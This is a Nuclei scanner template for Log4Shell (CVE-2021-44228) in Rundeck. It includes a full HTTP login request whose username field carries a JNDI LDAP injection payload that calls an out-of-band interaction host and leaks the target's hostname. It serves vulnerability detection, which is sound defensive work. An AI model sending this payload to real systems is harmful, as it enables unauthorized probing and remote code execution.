# Nuclei Template: Rundeck - Remote Code Execution (Apache Log4j)
**Template ID:** rundeck-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`rundeck-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
Rundeck is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

## Steps to reproduce / Exploit Payload
```http
POST /j_security_check HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Origin: {{BaseURL}}
Connection: close
Referer: {{BaseURL}}/user/login

j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.postdata.{{interactsh-url}}}&j_password=admin
```

## References
- https://docs.rundeck.com/docs/history/CVEs/log4j.html
- https://logging.apache.org/log4j/2.x/security.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
